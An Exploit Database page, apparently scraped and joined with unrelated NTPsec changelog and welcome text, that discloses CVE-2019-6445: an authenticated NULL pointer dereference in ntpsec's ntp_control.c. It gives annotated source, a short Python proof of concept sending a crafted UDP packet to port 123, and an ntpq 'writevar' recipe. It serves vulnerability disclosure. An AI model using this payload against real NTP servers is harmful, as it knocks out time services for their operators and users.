##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

For historic news from NTP Classic, see devel/HISTORIC-NEWS in thedistribution.
Not all news features are described here; see docs/ntpsec.adoc in thedistribution.
Much of the traditional function of a news file is now better addressedby browsing the comments in the revision history. This file will focuson user-visible changes.
== 2019-01-13: 1.1.3 ==
Lots of typo fixes, documentation cleanups, test targets.
In memory of Arland D. Williams Jr.
== 2018-08-28: 1.1.2 ==
Use data minimization on client requests https://datatracker.ietf.org/doc/draft-ietf-ntp-data-minimization/
Support AES-128-CMAC for authentication https://datatracker.ietf.org/doc/draft-ietf-ntp-mac/
== 2018-06-11: 1.1.1 ==
Log timestamps now include the year. This is useful wheninvestigating bugs involving time-setting and -g.
Many internal cleanups to clear the way for upcoming major features.They should generally not be user visible. Refer to the git-log ifyou are interested.
== 2018-03-14: 1.1.0 ==
RIP Stephen William Hawking, CH CBE FRS FRSA. 1942-01-08 - 2018-03-14You gave us a Brief History of Time. We will just count it.
Enough user visible changes have been made that this is the 1.1.0 releaseinstead of a 1.0.1.
The code size is now 55KLOC in C, 15KLOC in Python.
Digests longer then 20 bytes will be truncated.
We have merged NTP Classic's fix for CVE-2018-7182.
The following NTP Classic CVEs announced in February 2018 do not affect NTPsec:
\* CVE-2016-1549: Sybil vulnerability: ephemeral association attack\* CVE-2018-7170: Multiple authenticated ephemeral associations\* CVE-2018-7184: Interleaved symmetric mode cannot recover from bad state\* CVE-2018-7185: Unauthenticated packet can reset authenticated interleaved association\* CVE-2018-7183: ntpq:decodearr() can write beyond its buffer limit
We have dropped support for Broadcast servers. We had kept it forolder desktop operating systems listening on the local networkbroadcast domain, a use case that is no longer employed in saneenvironments, and no longer necessary for modern desktop OSs.
It is now possible to unpeer refclocks using a type/unit specificationrather than a magic IP address. This was the last obligatory use ofmagic IP addresses in the configuration grammar.
OpenBSD has been removed from the list of supported platforms forntpd. It will be restored if and when its clock API supports driftadjustment via ntp\_adjtime() or equivalent facility.
Mac OS X support has been dropped pending the implementation ofntp\_adjtime(2).
A bug that caused the rejection of 33% of packets from Amazon timeservice has been fixed.
== 2017-10-10: 1.0.0 ==
This is the 1.0 release.It has been a long road, getting from there to here.
The code size has been further reduced, to 55KLOC.
A bug inherited from Classic that could cause bad jitter from badpeers to be incorrectly zeroed, producing erratic or slow startup, hasbeen fixed.
The dependency of local refclocks returning 4-digit years onpre-synchronization to a network peer has been removed. It isthus possible to run in a fully-autonomous mode using multiplerefclocks and no network peers.
ntpmon now reports units on time figures.
ntpq now reports a count of Mode 6 messages received under sysstats.
You can now turn off restriction flags with an \_unrestrict\_ statementthat takes arguments exactly like a \_restrict\_, except that with noargument flags it removes any filter rule associated with theaddress/mask (as opposed to creating one with unrestrictedaccess). This is expected to be useful mainly with the "ntpq :config"command.
Builds are fully reproducible; see SOURCE\_DATE\_EPOCH and BUILD\_EPOCH.
== 2017-03-21: 0.9.7 ==
The code size has been further reduced, to 60KLOC.
A shell script, buildprep, has been added to the top level source directory.It prepares your system for an NTPsec source build by installing all requireddependencies on the build host.
Extra digits of precision are now output in numerous places. Thedriftfile now stores 6 digits past the decimal point instead of 3. Thestats files now stores 9 digits past the decimal point instead of 6 forsome fields. ntpq and ntpmon also report extra digits of precision inmultiple places. These changes may break simple parsing scripts.
Four contrib programs: cpu-temp-log; smartctl-temp-log, temper-temp-log,and zone-temp-log; have been combined into the new program ntplogtemp.The new program allows for easy logging of system temperatures and isinstalled by default.
The SHM refclock no longer limits the value of SHM time by default.This allows SHM to work on systems with no RTC by default.
The following CVEs revealed by a Mozilla penetration test and reported inCERT VU#325339 have been resolved:
CVE-2017-6464: Denial of Service via Malformed ConfigCVE-2017-6463: Authenticated DoS via Malicious Config OptionCVE-2017-6458: Potential Overflows in ctl\_put() functionsCVE-2017-6451: Improper use of snprintf() in mx4200\_send()
The following CVEs, announced simultaneously, affected NTP Classic butnot NTPsec, because we had already removed the attack surface:
CVE-2017-6462: Buffer Overflow in DPTS ClockCVE-2017-6455: Privileged execution of User Library codeCVE-2017-6452: Stack Buffer Overflow from Command LineCVE-2017-6459: Data Structure terminated insufficientlyCVE-2017-6460: Buffer Overflow in ntpq when fetching reslist
We gratefully acknowledge the work of of Dr.-Ing. Mario Hederichat cure53 in detecting these problems and his cooperation in resolving them.
== 2016-12-30: 0.9.6 ==
ntpkeygen has been moved from C to Python. This is not a functionalchange, just another move to improve maintainability and reduce attacksurface by decreasing line count.
ntpdig has also been moved from C to Python. Though this is alsomostly a move to reduce line count, the new version does have somefunctional changes. Obsolete options have been dropped, logging isdone a bit differently, and the synchronization-distance computation hasbeen brought up to date with ntpd's. Also, this version can be told tocollect multiple samples and use whichever has the lowest combinationof stratum and synchronization distance.
A new tool for time-service operators, ntpmon, supports real-timemonitoring of your NTP installation's status.
== 2016-11-23: 0.9.5 ==
This release includes a substantial refactoring of the core protocolimplementation. Due to unresolvable security issues, support forbroadcast/multicast clients has been dropped; broadcast servers arestill supported. Likewise, symmetric mode is now only partiallysupported. The `peer` directive has become a synonym for `server`.Servers which receive symmetric-active mode packets will immediatelygive a symmetric-passive-mode response, but will not mobilize a newassociation.
All remaining Perl code in the distribution has been moved to Python.
The trap feature, broken in NTP Classic at the time of the NTPSec fork,has been removed. So has its only known client, the ntptrap script in thedistribution.
A new visualization tool, ntpviz, generates graphical summaries oflogfile data that can be helpful for identifying problems such asmisconfigured servers. It replaces a messy and poorly documented pileof ancient Perl, awk, and S scripts; those have been removed.
It is now possible (and sometimes useful) to say "minpoll 0" for a1-second interval.
The ntpq tool for querying and configuring a running ntpd has beenmoved from C to Python. About the only visible effect this has isthat ntpq now resizes its peers display to accommodate wideterminal-emulator windows.
This release includes fixes for four low and medium-severityvulnerabilities:
CVE-2016-7434: Null pointer dereference on malformed mrulist requestCVE-2016-7429: Interface selection DoSCVE-2016-9311: Trap crashCVE-2016-9310: Mode 6 unauthenticated trap information disclosure and DDoS vector
Note that the "fixes" for CVE-2016-9310/9311 consist of completeremoval of the broken trap feature. This removal occurred post-0.9.4but prior to the discovery of these issues.
Further, an additional low-severity issue impacting 0.9.0 through0.9.3 has come to our attention:
CVE-2016-7433: Reboot sync calculation problem
This issue was already addressed in 0.9.4 but not treated as avulnerability.
The following NTP Classic CVEs do not impact NTPsec: CVE-2016-7427,CVE-2016-7428, CVE-2016-9312, CVE-2016-7431. We reject CVE-2016-7426,as it describes known and intended behavior which is a necessarylogical consequence of rate-limiting.
For more information on these security issues, see:https://lists.ntpsec.org/pipermail/devel/2016-November/002589.htmlhttp://support.ntp.org/bin/view/Main/SecurityNotice#November\_2016\_ntp\_4\_2\_8p9\_NTP\_Se
== 2016-08-16: 0.9.4 ==
usestats has been added to the statistics collection to recordsystem resource usage statistics.
A new, simpler configuration syntax for refclocks has beenimplemented. Configuration examples in the new syntax have been addedto each driver page.
Refclocks are now designated by name, not number. A list is availablefrom "./waf configure --list".
The rarely-used saveconfig feature in ntpd, and various associatedconfiguration directives, have been removed for security reasons. Thentpd --saveconfigquit option, undocumented in NTP Classic, hasalso been removed.
The ARCRON MSF refclock has been removed on the advice of last maintainer.
The Spectracom TSYNC PCI refclock has been removed. It required aproprietary driver. As a matter of good security policy, NTPsec willnot trust nor attempt to support code it cannot audit.
The Conrad Parallel Port radio refclock has been removed. It requireda third-party parallel-port driver for Linux that no longer exists.
Both Hopf refclocks have been removed. The 6039 driver required akernel driver that no longer exists; the 6021 driver duplicatedsupport in the generic driver.
The Austron refclock has been removed, on the grounds that it wasEOLed more than 20 years ago and there's been no aftermarket activityor web chatter around it for a decade.
The audio-path drivers (IRIG and CHU) have been removed. The classof hardware required to support them has gone essentially extinct dueto cheap DSP. The complexity/maintenance overhead of this codewas high enough to motivate dropping them.
This release contains a fix for one vulnerability inherited fromNTP Classic:
[Bug 3044] (CVE-2016-4954) Processing spoofed server packets
https://lists.ntpsec.org/pipermail/devel/2016-June/001299.html providesadditional information on this issue.
It also includes the following fix cross-ported from Classic:
[Bug 3047] refclock\_jjy does not work with C-DEX JST2000
== 2016-05-17: 0.9.3 ==
The long-deprecated Autokey feature has been removed.
This release contains fixes for three vulnerabilities inherited fromNTP Classic:
[Bug 3020] (CVE-2016-1551) Refclock impersonation vulnerability (Credit: Matt Street et. al. of Cisco ASIG)[Bug 3008] (CVE-2016-2519) ctl\_getitem() return value not always checked (Credit: Yihan Lian of the Qihoo 360 cloud security team)[Bug 2978] (CVE-2016-1548) Interleave-pivot (Credit: Miroslav Lichvar of RedHat and Jonathan Gardner of Cisco ASIG)
The following non-security fixes have beenforward-ported from Classic:
[Bug 2772] adj\_systime overflows tv\_usec[Bug 2814] msyslog deadlock when signaled.[Bug 2829] Look at pipe\_fds in ntpd.c[Bug 2887] fudge stratum only accepts values [0..16].[Bug 2958] ntpq: fatal error messages need a final newline.[Bug 2965] Local clock didn't work since 4.2.8p4.[Bug 2969] Segfault from ntpq/mrulist when looking at server with lots of clients
We regard the following NTP Classic bug -
[Bug 3012] (CVE-2016-1549) Sybil vulnerability: ephemeral association attack(Credit: Matthew van Gundy of Cisco ASIG)
as a duplicate of CVE-2015-7974 (see 0.9.1 releasenotes) and it is WONTFIX for the time being: it iscorrect-but-unfortunate behavior consequent to confusing andinflexible semantics of ntp.conf's access control language, and wewill address it with a future redesign effort. NTP Classic haspartially addressed this pair of issues by extending the syntax ofntp.keys to support IP ACLing. We are not currently aware of anydemand for this feature among NTPsec users and have no plans toimplement it; if you have a need for it, please file a bug athttps://gitlab.com/groups/NTPsec/issues to let us know you're outthere.
The remainder of the security issues patched in NTP Classic 4.2.8p7either are not believed to impact NTPsec or were already fixed in aprevious release.
== 2016-03-15: 0.9.2 ==
Point release.
\* can now cross-compile\* many documentation fixes\* Coverity is even more strict\* remove WWV, transmitter protocol changed, nobody builds receivers\* remove updwtmpx stuff, no longer useful
== 2016-01-25: 0.9.1 ==
Point release for security. Fixes:
\* CVE-2015-7973: Replay attack on authenticated broadcast mode (Aanchal Malhotra)\* CVE-2015-7975: nextvar() missing length check (Jonathan Gardner)\* CVE-2015-7979: Off-path Denial of Service (DoS) attack on authenticated broadcast and other preemptable modes (Aanchal Malhotra)\* CVE-2015-8138: Zero Origin Timestamp Bypass (Matthew van Gundy & Jonathan Gardner)\* CVE-2015-8139: Origin Leak: ntpq and ntpdc Disclose Origin Timestamp to Unauthenticated Clients (Matthew van Gundy)\* CVE-2015-8158: Potential Infinite Loop in ntpq (Jonathan Gardner)\* CVE-2016-1550: Timing attack on MAC verification (Daniel Franke)\* Missing length checks in decodearr() and outputarr() (Daniel Franke)
Two additional security issues have been reported to us for which weare not implementing code changes, but the user should be aware oftheir impact.
The first (CVE-2015-8140) pertains to NTP's dynamic reconfigurationfeature, which permits on-the-fly modification of NTP's configurationvia ntpq. This feature is rarely used, typically disabled, and canonly be enabled when authentication is configured. ntpd has no meansof detecting that a request to change its configuration is a replay ofan old packet. Therefore, if an administrator sets ntpd toconfiguration A and then to configuration B, an attacker who capturesthe packets commanding these changes can replay the first one andrestore ntpd's state to configuration A. This is only a concern whenthe configuration commands are sent over an untrustednetwork. Configuration changes made via localhost are not susceptible.
This is an inherent design flaw in NTP cryptography and in the remotereconfiguration protocol, and can be fixed only with a considerablereworking and by changing the protocol in a way that is neitherforward nor backward compatible. This cryptographic rework is on thehorizon in the form of Network Time Security (currently a draft in theIETF network time working group). Given that this vulnerabilityimpacts few if any real users, we have chosen to defer fixing it untilwe have tools more suitable to the task. For the mean time, if yourely on NTP's reconfiguration support, we recommend either restrictingits use to localhost or trusted networks, or tunneling through SSH ora VPN. The 'nomodify' option to the 'restrict' directive may be usedto enforce this policy.
The second (CVE-2015-7974) pertains to the fact that when multipletrusted keys are configured, no mechanism exists to associateparticular keys with particular peers or assign particular privileges.This is not a bug, per se, but rather a lack of expressiveness inNTP's configuration language. We intend to address in a future releaseas part of a larger redesign aimed at giving clearer semantics to theconfiguration language and making it easier to write safeconfigurations.
Note that NTPsec is not impacted by CVE-2015-7976, CVE-2015-7977, orCVE-2015-7978. CVE-2015-7977 and CVE-2015-7978 both pertain to mode 7packets, support for which was completely removed before NTPsec'sfirst beta. CVE-2015-7976 is a feature request to restrict the formatof filenames used in saveconfig commands. Saveconfig support isdisabled at compile time in NTPsec and will not be re-enabled withoutmuch more extensive hardening.
Other fixes:
Coverity found a slow memory leak in the asynchronous-DNS code.
== 2015-11-16: 0.9.0 ==
Initial NTPsec beta release.
\* Canonical forge for git clones and issue tracking is https://gitlab.com/NTPsec/ntpsec
\* The documentation has been extensively updated and revised. One important change is that manual pages are now generated from the same masters as this web documentation, so the two will no longer drift out of synchronization.
\* Internally, there is more consistent use of nanosecond precision. A visible effect of this is that time stepping with sufficiently high-precision time sources could be accurate down to nanoseconds rather than microseconds; this might actually matter for GPSDOs and high-quality radio clocks.
\* The deprecated 'ntpdc' utility, long since replaced by 'ntpq', has been removed.
\* The 'ntpsnmpd' daemon, incomplete and not conformant with RFC 5907, has been removed.
\* A number of obsolete refclocks have been removed.
\* The 'sntp' program has been renamed 'ntpdig' in order to make NTP installables have a uniform name prefix and take up less namespace. Also, ntp-keygen is now 'ntpkeygen', ntp-wait is 'ntpwait', and update-leap is now 'ntpleapfetch'.
\* A new utility, 'ntpfrob', collects several small diagnostic functions for reading and tweaking the local clock hardware, including reading the clock tick rate, precision, and jitter. Part of it formerly traveled as 'tickadj'.
\* The deprecated 'ntpdate' program has been replaced with a shell wrapper around 'ntpdig'.
\* Log timestamps look a little different; they are now in ISO 8601 format.
\* Autokey is not supported in this release.

Additionally the NTPsec team is aware of the following vulnerabilitiesimpacting autokey: CVE-2015-7691, CVE-2015-7692, CVE-2015-7702. NTPsecdoes not support building with autokey support and therefore is notexposed; the vulnerable code will not be fixed, but will be removed ina future release.
NTPsec is not impacted by CVE-2015-7848 (mode 7 loop counter underrun)because ntpdc and support for mode 7 packets have been removed.

# Welcome to NTPsec

"Perfection is achieved, not when there is nothing more to add, but
when there is nothing left to take away."
— Antoine de Saint-Exupéry

![clocktower128.png](clocktower128.png)

Welcome to the NTPsec project - a secure, hardened, and improved
implementation of Network Time Protocol derived from NTP Classic, Dave
Mills’s original.

NTPsec, as its name implies, is a more secure NTP. Our goal is to
deliver code that can be used with confidence in deployments with the
most stringent security, availability, and assurance requirements.

Towards that end we apply best practices and state-of-the art
technology in code auditing, verification, and testing. We begin with
the most important best practice: true open-source code review. The
NTPsec code is available in a public git repository. One of our goals
is to support broader community participation.

Authenticated NULL pointer exception in ntpsec
==============================================
CVE-2019-6445
This is the third of four bugs. For more visit: https://dumpco.re/blog/ntpsec-bugs
An authenticated NULL pointer exception bug was found in ntpsec.
Affected versions: ntpsec 1.1.0, 1.1.1, 1.1.2
Timeline:
2018-10-20 Bug discovered
2018-10-20 Bug reported
2019-01-13 Vendor released patch version 1.1.3
2019-01-16 MITRE allocated CVE-2019-6445
It was found possible for an authenticated attacker to cause the ntpd
daemon to SIGSEGV due to a NULL pointer dereference in ntp\_control.c.
valuep is set to NULL through a call to ctl\_getitem on line 2911, and later
dereferenced on line 2930. See inline comments below:
2875 static void
2876 write\_variables(
2877 struct recvbuf \*rbufp,
2878 int restrict\_mask
2879 )
2880 {
2881 const struct ctl\_var \*v;
2882 int ext\_var;
2883 char \*valuep;
2884 long val;
..
2893 val = 0;
..
2911 while ((v = ctl\_getitem(sys\_var, &valuep)) != 0) { // <- valuep is set to NULL in ctl\_getitem()
2912 ext\_var = 0;
..
2929 errno = 0;
2930 if (!ext\_var && (\*valuep == '\0' // <- valuep is dereferenced
2931 || (val = strtol(valuep, NULL, 10), errno != 0))) {
2509 ctl\_getitem(
2510 const struct ctl\_var \*var\_list,
2511 char \*\*data
2512 )
2513 {
..
2521 static const struct ctl\_var eol = { 0, EOV, NULL };
2522 static char buf[128];
2523 static u\_long quiet\_until;
2524 const struct ctl\_var \*v;
2525 char \*cp;
2526 char \*tp;
..
2538
2539 /\* Scan the string in the packet until we hit comma or
2540 \* EoB. Register position of first '=' on the fly. \*/
2541 for (tp = NULL, cp = reqpt; cp != reqend; ++cp) { // <- tp set to NULL
2542 if (\*cp == '=' && tp == NULL) // <- condition is never met due to missing value in request
2543 tp = cp; // (the request doesn't contain an equals sign)
2544 if (\*cp == ',')
2545 break;
2546 }
2547
2548 /\* Process payload, if any. \*/
2549 \*data = NULL; // <- \*data set to NULL
2550 if (NULL != tp) { // <- condition is false, as tp is NULL
..
2566 /\* copy data, NUL terminate, and set result data ptr \*/
2567 memcpy(buf, plhead, plsize);
2568 buf[plsize] = '\0';
2569 \*data = buf; // <- this line is never executed, \*data remains NULL
2570 } else {
2571 /\* no payload, current end --> current name termination \*/
2572 tp = cp;
2573 }
..
2615 if (EOV & v->flags) // <- (0x80 & 3) evaluates to true
2616 \*data = NULL; // <-- \*data set to NULL again
2617 else
2618 reqpt = cp + (cp != reqend);
2619 return v;
Proof of concept exploit:
#!/usr/bin/env python
import sys
import socket
buf = ("\x16\x03\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x6c\x65\x61\x70" +
"\x00\x00\x00\x01\x5c\xb7\x3c\xdc\x9f\x5c\x1e\x6a\xc5\x9b\xdf\xf5" +
"\x56\xc8\x07\xd4")
sock = socket.socket(socket.AF\_INET, socket.SOCK\_DGRAM)
sock.sendto(buf, ('127.0.0.1', 123))
Alternatively ntpq from ntp classic can be usedby performing an authenticated `writevar` request without a value:
ntp-4.2.8p12/ntpq/ntpq 127.0.0.1
ntpq> writevar 0 leap <-- note the absense of a variable value
Keyid: 1
MD5 Password: <-- enter the correct password, in this example "gurka"
127.0.0.1: timed out, nothing received

# Authenticated remotely triggerable NULL pointer dereference in ntp\_control.c

Please note that I will publicly disclose this issue no later than January 18, 2019. 90 days from today.

It was found possible for an authenticated attacker to cause the ntpd daemon to SIGSEGV due to a NULL pointer dereference in ntp\_control.c.

Using ntpq from ntp classic, an authenticated `writevar` request without a value was sent to trigger the issue.

Proof of concept exploit:

```
#!/usr/bin/env python
import sys
import socket

buf = ("\x16\x03\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x6c\x65\x61\x70" +
       "\x00\x00\x00\x01\x5c\xb7\x3c\xdc\x9f\x5c\x1e\x6a\xc5\x9b\xdf\xf5" +
       "\x56\xc8\x07\xd4")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(buf, ('127.0.0.1', 123))
```

Alternatively ntpq from ntp classic can be used:

```
ntp-4.2.8p12/ntpq/ntpq 127.0.0.1
ntpq> writevar 0 leap                <-- note the absense of a variable value
Keyid: 1
MD5 Password:                        <-- enter the correct password, in this example "gurka"
127.0.0.1: timed out, nothing received
***Request timed out
ntpq>
```
